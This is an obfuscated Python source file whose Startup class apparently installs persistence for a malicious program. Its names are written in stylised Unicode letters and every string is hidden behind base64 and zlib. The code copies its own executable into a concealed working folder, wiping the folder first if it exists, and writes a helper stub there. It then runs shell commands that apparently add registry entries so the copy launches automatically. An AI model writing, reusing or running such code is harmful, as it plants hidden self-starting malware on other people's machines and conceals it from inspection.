import subprocess
import os
import shutil
import sys

class Startup:

    def __init__(self):
        𝘴𝙚𝘵𝘢𝘁𝘁𝘳(𝘀𝗲𝗹𝙛, 'working_dir', 𝘰𝙨.getenv(__𝙞𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x0b\x0cs\n\x0cru\x0b\r\x0c\xb4\xb5\x05\x00\x17\xa5\x03\x89')).decode()) + __𝗶𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\x0f+I\xf6\xc8\xa9\x8c\nw+\x05\x00\x1c\x0c\x04f')).decode())
        if 𝘴𝙚𝘭𝘧.check_self():
            return
        𝘴𝗲𝗹𝙛.mkdir()
        𝘀𝙚𝗹𝗳.write_stub()
        𝙨𝙚𝙡𝘧.regedit()

    def check_self(self):
        if 𝗼𝘴.path.realpath(𝘀𝙮𝘴.executable) == 𝘀𝘦𝗹𝗳.working_dir + __𝘪𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\x0f\xcaHq65H\xf5\x08\xb4\x05\x00\x18\x83\x03\xa1')).decode():
            return True
        return False

    def mkdir(self):
        if not 𝗼𝘴.path.isdir(𝘀𝗲𝘭𝘧.working_dir):
            𝙤𝙨.mkdir(𝘀𝘦𝘭𝘧.working_dir)
        else:
            𝘴𝘩𝘂𝘁𝗶𝙡.rmtree(𝘀𝙚𝙡𝘧.working_dir)
            𝘰𝘀.mkdir(𝘴𝗲𝙡𝙛.working_dir)

    def write_stub(self):
        𝘴𝘩𝙪𝘵𝗶𝘭.copy2(𝙤𝙨.path.realpath(𝘴𝘺𝙨.executable), 𝘴𝘦𝙡𝘧.working_dir + __𝗶𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\x0f\xcaHq65H\xf5\x08\xb4\x05\x00\x18\x83\x03\xa1')).decode())
        with 𝙤𝗽𝙚𝘯(file=__𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK56LN\xce\x0b+\xf5\xc9\xf5\xcaHq\xb4\xb5\x05\x00.\x12\x05S')).decode().format(𝘴𝗲𝗹𝙛.working_dir), mode=__𝙞𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝘧:
            𝗳.write(__𝙞𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0bt\x0f\xcbJt\xb7HO2\x8a\xcau\xce\xf5\xcbHr/OO56L\x8erw3\xf0\xc9\x0b2Iq\xb4\xb5\x05\x00\xdc\x8e\x0b\x8a')).decode().format(𝙨𝘦𝘭𝙛.working_dir))

    def regedit(self):
        𝘀𝘂𝙗𝘱𝙧𝗼𝙘𝗲𝙨𝘴.run(args=[__𝘪𝘮𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK\xce\r\xcb\x03\x00\x03\xf1\x01\x95')).decode(), __𝘪𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8br\x0f+\x8e\x8a\x08\xca\x01\x00\x0c\x8c\x02\xdb')).decode(), __𝘪𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0bv-q\t\x0b\xab\x08I2\x8a2H1r\xab\x8c\n\xab\xf0K\x0c\xf7\xabL2\xf6+\x8b\xca\x0bJ\x0e3\xca)\x8dr\xb74N6\xacpI\x89\xf0\xaa\x8c\n75\x08\xcb\r\xabL6\xca)K\xca\xa9\x08N\t7\xb1\x05\x00\x1b\xfe\x170')).decode(), __𝗶𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf31\x8e\xb4\x05\x00\x02\xbc\x01\x16')).decode(), __𝙞𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a\x90\x03\xee')).decode(), __𝗶𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf31\x8a\xb4\x05\x00\x02\xb9\x01\x15')).decode()], shell=True)
        𝘴𝙪𝗯𝙥𝙧𝗼𝘤𝗲𝙨𝙨.run(args=[__𝙞𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\xce\r\xcb\x03\x00\x03\xf1\x01\x95')).decode(), __𝗶𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8b\x0c\x0f\xca\x06\x00\x03|\x01n')).decode(), __𝗶𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x0bv-q\t\x0b\xab\x08I2\x8a2H1r\xab\x8c\n\xab\xf0K\x0c\xf7\xabL2\xf6+\x8b\xca\x0bJ\x0e3\xca)\x8dr\xb74N6\xacpI\x89\xf0\xaa\x8c\n75\x08\xcb\r\xabL6\xca)K\xca\xa9\x08N\t7\xb1\x05\x00\x1b\xfe\x170')).decode(), __𝗶𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf31\x8e\xb4\x05\x00\x02\xbc\x01\x16')).decode(), __𝘪𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a\x90\x03\xee')).decode(), __𝗶𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf31\x0e\xb4\x05\x00\x02\xac\x01\x0e')).decode(), __𝘪𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0b\xcd\x0e\xf3\x880\xf4K\x04\x00\x0b\xf9\x02\x97')).decode(), __𝙞𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf31\n\xb4\x05\x00\x02\xa9\x01\r')).decode(), __𝙞𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK56LN\xce\x0b+\xf5\xc9\xf5\xcaHq\xb4\xb5\x05\x00.\x12\x05S')).decode().format(𝙨𝘦𝗹𝗳.working_dir), __𝗶𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf31\x8a\xb4\x05\x00\x02\xb9\x01\x15')).decode()], shell=True)